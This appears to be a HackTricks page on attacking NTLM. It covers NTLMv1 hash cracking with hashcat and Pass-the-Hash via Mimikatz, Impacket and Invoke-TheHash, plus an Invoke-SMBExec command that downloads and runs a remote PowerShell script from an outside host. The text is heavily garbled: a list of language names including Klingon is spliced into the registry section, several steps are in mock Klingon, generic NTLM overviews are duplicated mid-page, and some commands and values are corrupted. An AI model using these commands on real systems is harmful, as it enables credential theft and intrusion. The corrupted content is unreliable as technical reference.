# NTLM

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!HackTricks</strong></a><strong>!</strong></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Basic Information

In environments where **Windows XP and Server 2003** are in operation, LM (Lan Manager) hashes are utilized, although it's widely recognized that these can be easily compromised. A particular LM hash, `AAD3B435B51404EEAAD3B435B51404EE`, indicates a scenario where LM is not employed, representing the hash for an empty string.

By default, the **Kerberos** authentication protocol is the primary method used. NTLM (NT LAN Manager) steps in under specific circumstances: absence of Active Directory, non-existence of the domain, malfunctioning of Kerberos due to improper configuration, or when connections are attempted using an IP address rather than a valid hostname.

The presence of the **"NTLMSSP"** header in network packets signals an NTLM authentication process.

Support for the authentication protocols - LM, NTLMv1, and NTLMv2 - is facilitated by a specific DLL located at `%windir%\Windows\System32\msv1\_0.dll`.

**Key Points**:
- LM hashes are vulnerable and an empty LM hash (`AAD3B435B51404EEAAD3B435B51404EE`) signifies its non-use.
- Kerberos is the default authentication method, with NTLM used only under certain conditions.
- NTLM authentication packets are identifiable by the "NTLMSSP" header.
- LM, NTLMv1, and NTLMv2 protocols are supported by the system file `msv1\_0.dll`.

## LM, NTLMv1 and NTLMv2

You can check and configure which protocol will be used:

### GUI

Execute _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. There are 6 levels (from 0 to 5).

![](<../../.gitbook/assets/image (92).png>)

### Registry

This will set the level 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Possible values: 

- **Klingon** (KLI)
- **English** (ENG)
- **Spanish** (SPA)
- **French** (FRA)
- **German** (GER)
- **Italian** (ITA)
- **Russian** (RUS)
- **Chinese** (CHI)
- **Japanese** (JPN)
- **Portuguese** (POR)
- **Arabic** (ARA)
- **Hindi** (HIN)
- **Swahili** (SWA)
- **Dutch** (DUT)
- **Korean** (KOR)
- **Turkish** (TUR)
- **Greek** (GRE)
- **Hebrew** (HEB)
- **Polish** (POL)
- **Czech** (CZE)
- **Hungarian** (HUN)
- **Romanian** (ROM)
- **Swedish** (SWE)
- **Finnish** (FIN)
- **Danish** (DAN)
- **Norwegian** (NOR)
- **Indonesian** (IND)
- **Malay** (MAL)
- **Vietnamese** (VIE)
- **Thai** (THA)
- **Bulgarian** (BUL)
- **Slovak** (SLK)
- **Slovenian** (SLV)
- **Croatian** (CRO)
- **Serbian** (SRB)
- **Ukrainian** (UKR)
- **Estonian** (EST)
- **Latvian** (LAT)
- **Lithuanian** (LIT)
- **Macedonian** (MAC)
- **Albanian** (ALB)
- **Bosnian** (BOS)
- **Mongolian** (MON)
- **Persian** (PER)
- **Tagalog** (TAG)
- **Icelandic** (ICE)
- **Sinhala** (SIN)
- **Bengali** (BEN)
- **Tamil** (TAM)
- **Telugu** (TEL)
- **Marathi** (MAR)
- **Gujarati** (GUJ)
- **Kannada** (KAN)
- **Urdu** (URD)
- **Malayalam** (MAL)
- **Odia** (ODI)
- **Punjabi** (PUN)
- **Assamese** (ASS)
- **Maithili** (MAI)
- **Nepali** (NEP)
- **Bhojpuri** (BHO)
- **Sundanese** (SUN)
- **Javanese** (JAV)
- **Amharic** (AMH)
- **Hausa** (HAU)
- **Yoruba** (YOR)
- **Igbo** (IGB)
- **Zulu** (ZUL)
- **Xhosa** (XHO)
- **Afrikaans** (AFR)
- **Swedish Chef** (CHE)
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Basic NTLM Domain authentication Scheme

1. **user** vItlhutlh **credentials** vIlo'
2. **client machine** **authentication request** **yIlo'** **domain name** **username** **bIjatlh**
3. **server** **challenge** **yIlo'**
4. **client** **challenge** **encrypt** **password** **hash** **key** **response** **yIlo'**
5. **server** **Domain controller** **yIlo'** **domain name, username, challenge, response** **bIjatlh**. **Active Directory** **configured** **Domain name** **server** **name** **bIjatlh** **credentials** **local** **yIlo'**.
6. **domain controller** **correct** **yIlo'** **information** **server** **yIlo'**

**server** **Domain Controller** **Secure Channel** **Netlogon** **server** **Domain Controller** **password** **server** **NTDS.DIT** **db** **yIlo'**.

### Local NTLM authentication Scheme

**authentication** **before** **server** **user** **hash** **SAM** **file** **yIlo'**. **Domain Controller** **yIlo'** **server** **user** **authenticate** **yIlo'**.

### NTLMv1 Challenge

**challenge length** **8 bytes** **response length** **24 bytes** **yIlo'**.

**hash NT (16bytes)** **3 parts** **7bytes each** (7B + 7B + (2B+0x00\*5)): **last part** **zeros** **yIlo'**. **challenge** **ciphered separately** **part** **resulting** **ciphered bytes** **joined**. **Total** **8B + 8B + 8B = 24Bytes** **yIlo'**.

**Problems**:

* **randomness** **lack** **yIlo'**
* **3 parts** **attacked separately** **NT hash** **find** **yIlo'**
* **DES** **crackable** **yIlo'**
* **3º key** **composed** **5 zeros** **yIlo'**.
* **same challenge** **response** **same** **yIlo'**. **challenge** **victim** **string** "**1122334455667788**" **response** **precomputed rainbow tables** **attack** **yIlo'**.

### NTLMv1 attack

**Unconstrained Delegation** **configured** **environments** **common** **abuse Print Spooler service** **configured** **yIlo'**.

**credentials/sessions** **AD** **ask** **printer** **authenticate** **host under your control** **abuse** `metasploit auxiliary/server/capture/smb` **responder** **authentication challenge** **1122334455667788** **authentication attempt** **capture** **authentication** **NTLMv1** **crack** **yIlo'**.\
`responder` **flag `--lm`** **authentication** **downgrade** **try**.\
**Note** **technique** **authentication** **NTLMv1** (NTLMv2 valid) **performed**.

**printer** **computer account** **authentication** **computer accounts** **long and random passwords** **probably won't be able to crack** **common dictionaries** **NTLMv1** **authentication** **DES** ([more info here](./#ntlmv1-challenge)) **services** **dedicated** **cracking DES** **crack** **yIlo'** ([https://crack.sh/](https://crack.sh) **example**).

### NTLMv1 attack with hashcat

NTLMv1 **NTLMv1 Multi Tool** [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) **NTLMv1 messages** **method** **broken** **hashcat** **yIlo'**.

**command**
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
# NTLM

## Introduction

NTLM (NT LAN Manager) is a suite of Microsoft security protocols that provides authentication, integrity, and confidentiality to users. It is commonly used in Windows environments for user authentication.

## NTLM Authentication Process

The NTLM authentication process involves the following steps:

1. The client sends a request to the server.
2. The server responds with a challenge.
3. The client encrypts the challenge using the user's password hash and sends it back to the server.
4. The server verifies the response by decrypting it and comparing it with the expected value.
5. If the response is valid, the server grants access to the client.

## NTLM Vulnerabilities

NTLM has several vulnerabilities that can be exploited by attackers:

1. **Pass-the-Hash (PtH) Attack**: An attacker captures the NTLM hash of a user and uses it to authenticate as that user without knowing the actual password.
2. **Pass-the-Ticket (PtT) Attack**: An attacker captures the Kerberos ticket of a user and uses it to authenticate as that user without knowing the actual password.
3. **NTLM Relay Attack**: An attacker intercepts the NTLM authentication request and relays it to another server, gaining unauthorized access.
4. **NTLM Downgrade Attack**: An attacker forces the use of weaker NTLM versions, making it easier to crack the password hash.

## Mitigation Techniques

To mitigate NTLM vulnerabilities, you can implement the following techniques:

1. **Disable NTLM**: Disable NTLM authentication and use more secure authentication protocols like Kerberos.
2. **Enforce Strong Password Policies**: Implement strong password policies to prevent easy cracking of password hashes.
3. **Enable SMB Signing**: Enable SMB signing to protect against NTLM relay attacks.
4. **Enable Extended Protection for Authentication**: Enable Extended Protection for Authentication to prevent NTLM downgrade attacks.

## Conclusion

NTLM is a widely used authentication protocol in Windows environments. However, it has several vulnerabilities that can be exploited by attackers. By implementing the mitigation techniques mentioned above, you can enhance the security of your Windows systems.
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
# NTLM

NTLM (NT LAN Manager) is a suite of Microsoft security protocols that provides authentication, integrity, and confidentiality to users. It is commonly used in Windows environments for user authentication.

## NTLM Authentication Process

1. The client sends a request to the server.
2. The server responds with a challenge.
3. The client encrypts the challenge using the user's password hash and sends it back to the server.
4. The server verifies the response by decrypting it using the user's password hash.
5. If the response is valid, the server grants access to the client.

## NTLM Vulnerabilities

NTLM has several vulnerabilities that can be exploited by attackers:

1. **Pass-the-Hash (PtH) Attack**: An attacker captures the NTLM hash of a user and uses it to authenticate as that user without knowing the actual password.
2. **Pass-the-Ticket (PtT) Attack**: An attacker captures the Kerberos ticket of a user and uses it to authenticate as that user without knowing the actual password.
3. **NTLM Relay Attack**: An attacker intercepts the NTLM authentication request and relays it to another server, gaining unauthorized access.
4. **NTLM Downgrade Attack**: An attacker forces the use of weaker NTLM protocols, making it easier to crack the password hash.

## Mitigations

To mitigate NTLM vulnerabilities, consider the following measures:

1. **Disable NTLM**: Disable NTLM authentication if not required.
2. **Enable SMB Signing**: Enable SMB signing to prevent NTLM relay attacks.
3. **Use Strong Passwords**: Enforce the use of strong passwords to make it harder to crack the password hash.
4. **Implement Multi-Factor Authentication (MFA)**: Implement MFA to add an extra layer of security to the authentication process.
5. **Monitor NTLM Traffic**: Monitor and analyze NTLM traffic for any suspicious activity.

By implementing these mitigations, you can enhance the security of your Windows environment and protect against NTLM-related attacks.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Run hashcat (distributed is best through a tool such as hashtopolis) as this will take several days otherwise.

---

qaStaHvIS hashcat (hashtopolis ghaH tool Distributed best) run. vaj hashcat (hashtopolis ghaH tool Distributed best) run.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
**qaStaHvIS** jatlh **password** DaH **'e'**. **Demo** qorDu' **cheat** **jatlh**.
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
**DaH jImej:** hashcat-utilities vItlhutlhlaHchugh, NTLM hash qutlhvam vItlhutlhlaHchugh des keys vItlhutlh.
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Ginally the last part:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
# NTLM

## Introduction

NTLM (NT LAN Manager) is a suite of Microsoft security protocols that provide authentication, integrity, and confidentiality to users. It is commonly used in Windows environments for user authentication.

## NTLM Authentication Process

The NTLM authentication process involves the following steps:

1. The client sends a request to the server.
2. The server responds with a challenge.
3. The client encrypts the challenge using the user's password hash and sends it back to the server.
4. The server verifies the response and grants access if it is valid.

## NTLM Vulnerabilities

NTLM has several vulnerabilities that can be exploited by attackers:

1. **Pass-the-Hash (PtH) Attack**: Attackers can use the captured password hash to authenticate themselves without knowing the actual password.
2. **Pass-the-Ticket (PtT) Attack**: Attackers can use Kerberos tickets to authenticate themselves without knowing the user's password.
3. **NTLM Relay Attack**: Attackers can relay NTLM authentication requests to other servers, gaining unauthorized access.
4. **NTLM Downgrade Attack**: Attackers can force the use of weaker NTLM versions, making it easier to crack the password hash.

## Mitigation Techniques

To mitigate NTLM vulnerabilities, you can implement the following techniques:

1. **Disable NTLM**: Disable NTLM authentication and use more secure protocols like Kerberos.
2. **Enforce Strong Password Policies**: Implement strong password policies to prevent easy cracking of password hashes.
3. **Enable Extended Protection for Authentication**: Enable Extended Protection for Authentication (EPA) to protect against NTLM relay attacks.
4. **Enable SMB Signing**: Enable SMB signing to prevent NTLM downgrade attacks.

## Conclusion

NTLM is a widely used authentication protocol in Windows environments. However, it has several vulnerabilities that can be exploited by attackers. By implementing the mitigation techniques mentioned above, you can enhance the security of your Windows systems and protect against NTLM-related attacks.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**Challenge length is 8 bytes** and **2 responses are sent**: One is **24 bytes** long and the length of the **other** is **variable**.

**The first response** is created by ciphering using **HMAC\_MD5** the **string** composed by the **client and the domain** and using as **key** the **hash MD4** of the **NT hash**. Then, the **result** will by used as **key** to cipher using **HMAC\_MD5** the **challenge**. To this, **a client challenge of 8 bytes will be added**. Total: 24 B.

The **second response** is created using **several values** (a new client challenge, a **timestamp** to avoid **replay attacks**...)

If you have a **pcap that has captured a successful authentication process**, you can follow this guide to get the domain, username , challenge and response and try to creak the password: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**Once you have the hash of the victim**, you can use it to **impersonate** it.\
You need to use a **tool** that will **perform** the **NTLM authentication using** that **hash**, **or** you could create a new **sessionlogon** and **inject** that **hash** inside the **LSASS**, so when any **NTLM authentication is performed**, that **hash will be used.** The last option is what mimikatz does.

**Please, remember that you can perform Pass-the-Hash attacks also using Computer accounts.**

### **Mimikatz**

**Needs to be run as administrator**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
### Pass-the-Hash from linux

You can obtain code execution in Windows machines using Pass-the-Hash from Linux.\
[**Access here to learn how to do it.**](../../windows/ntlm/broken-reference/)

### Impacket Windows compiled tools

You can download[ impacket binaries for Windows here](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (In this case you need to specify a command, cmd.exe and powershell.exe are not valid to obtain an interactive shell)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* There are several more Impacket binaries...

### Invoke-TheHash

You can get the powershell scripts from here: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec

#### Invoke-WMIExec

`Invoke-WMIExec` is a PowerShell script that allows you to execute commands on remote Windows systems using Windows Management Instrumentation (WMI). It leverages the `Win32_Process` class in WMI to create a new process on the target system and execute the specified command.

##### Usage

To use `Invoke-WMIExec`, you need to provide the following parameters:

- `-Target` : The IP address or hostname of the target system.
- `-Username` : The username to authenticate with on the target system.
- `-Password` : The password to authenticate with on the target system.
- `-Command` : The command to execute on the target system.

Here is an example of how to use `Invoke-WMIExec`:

```powershell
Invoke-WMIExec -Target 192.168.1.100 -Username Administrator -Password P@ssw0rd -Command "ipconfig /all"
```

This will execute the `ipconfig /all` command on the remote system with the specified credentials.

##### Limitations

- `Invoke-WMIExec` requires administrative privileges on the target system.
- The target system must have WMI enabled and accessible.
- The specified username and password must have administrative privileges on the target system.

##### Recommendations

- Use strong and unique passwords for the target system.
- Restrict access to the target system to only trusted IP addresses or networks.
- Regularly monitor and review WMI logs for any suspicious activity.

##### Disclaimer

This script is intended for authorized penetration testing and should only be used on systems that you have permission to test. Unauthorized use of this script may be illegal and could result in criminal and/or civil penalties.
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient

`Invoke-SMBClient` is a PowerShell script that allows you to interact with the Server Message Block (SMB) protocol. It provides a command-line interface to perform various operations on SMB shares, such as listing files and directories, uploading and downloading files, and executing commands on remote systems.

To use `Invoke-SMBClient`, you need to have administrative privileges on the target system and have PowerShell installed. Once you have met these requirements, you can run the script and start interacting with SMB shares.

Here are some examples of how you can use `Invoke-SMBClient`:

- List files and directories in an SMB share:
```
Invoke-SMBClient -Target <target> -Share <share> -List
```

- Upload a file to an SMB share:
```
Invoke-SMBClient -Target <target> -Share <share> -UploadFile <local_file> -Destination <remote_path>
```

- Download a file from an SMB share:
```
Invoke-SMBClient -Target <target> -Share <share> -DownloadFile <remote_file> -Destination <local_path>
```

- Execute a command on a remote system via SMB:
```
Invoke-SMBClient -Target <target> -Share <share> -Command <command>
```

Remember to replace `<target>`, `<share>`, `<local_file>`, `<remote_path>`, `<remote_file>`, `<local_path>`, and `<command>` with the appropriate values for your scenario.

`Invoke-SMBClient` can be a useful tool for interacting with SMB shares during penetration testing or other security assessments. However, it is important to use it responsibly and with proper authorization to avoid any legal or ethical issues.
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum

`Invoke-SMBEnum` is a PowerShell script that can be used to enumerate information from SMB services. It leverages the `NetSessionEnum` and `NetShareEnum` functions to gather details about active sessions and shared resources on a target system.

To use `Invoke-SMBEnum`, you need to have administrative privileges on the target system. The script can be executed directly from a PowerShell session or incorporated into a larger script or tool.

The script takes the following parameters:

- `-ComputerName`: Specifies the target system(s) to enumerate. Multiple systems can be specified by separating them with commas.
- `-Credential`: Specifies the credentials to use for authentication on the target system(s). This parameter is optional, and if not provided, the current user's credentials will be used.
- `-Verbose`: Enables verbose output, providing additional details during the enumeration process.

Once executed, `Invoke-SMBEnum` will connect to the target system(s) using the specified credentials (or the current user's credentials) and retrieve information about active sessions and shared resources. The output includes details such as the username, computer name, session ID, and share name.

This script can be a valuable tool during penetration testing or security assessments, as it allows you to gather information about SMB services on target systems. By understanding the active sessions and shared resources, you can identify potential vulnerabilities or misconfigurations that could be exploited.
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

**ghItlh** vItlhutlh **vay'**. **Hosts** **chel**, **'oH** **'ej** **ghItlh** **'op** **tlhIngan** (_SMBExec, WMIExec, SMBClient, SMBEnum_) **vay'** **'op** **tlhIngan** **'ej** **WMIExec** **'op** **tlhIngan** **'ej** **Command** **parameter** **ghItlh** **'e'** **'oH** **check** **'e'** **permissions** **vay'**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Qa'leghvamDaq 'ej 'oH administrator 'ej 'oH**

vaj tool vItlhutlh (modify LSASS memory) mimikatz.
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Manual Windows remote execution with username and password

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## Extracting credentials from a Windows Host

**For more information about** [**how to obtain credentials from a Windows host you should read this page**](broken-reference)**.**

## NTLM Relay and Responder

**Read more detailed guide on how to perform those attacks here:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## Parse NTLM challenges from a network capture

**You can use** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
